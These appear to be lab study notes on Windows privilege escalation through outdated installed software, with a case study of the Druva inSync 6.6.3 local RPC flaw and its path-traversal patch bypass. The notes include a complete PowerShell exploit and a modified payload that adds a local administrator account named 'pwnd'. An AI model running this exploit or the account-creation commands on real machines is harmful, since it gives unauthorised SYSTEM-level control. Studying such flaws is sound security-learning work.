Installed software can offer privilege escalation paths, especially if outdated because organisations and users may not update them as often as they update the operating system.

**List Installed Software, Versions, and Vendors**
```
wmic product get name,version,vendor
```

### Case Study: Druva inSync 6.6.3
Druva inSync has a privilege escalation vulnerability due to its `RPC (Remote Procedure Call)` server running on port 6064 with SYSTEM privileges, accessible only from localhost. It exposes procedure 5, ***allowing any command execution***.

A patch was issued, where they restricted commands to `C:\ProgramData\Druva\inSync4\`, but you could simply ask the server to run `C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe` bypassing it via ***path traversal***.

[[Pasted image 20250325000147.png]]
- first packet is simply a ***hello packet*** that contains a fixed string. 
- second packet indicates that we want to execute procedure number 5, as this is the vulnerable procedure that will execute any command.
- last two packets are used to send the length of the command and the command string to be executed.

**Original Exploit Code**
```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```
You can open a PowerShell console and paste the exploit directly to execute it.

Note: The exploit's default payload, specified in the `$cmd` variable, will create a user named `pwnd` in the system, but won't assign it administrative privileges. So, I changed it to below:
```powershell
net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add
```

**If the exploit was successful, the user `pwnd' should exists**
```
net user pwnd
```

**Run the cmd prompt as an administrator and when prompted for password use the `pwnd` account creds.**
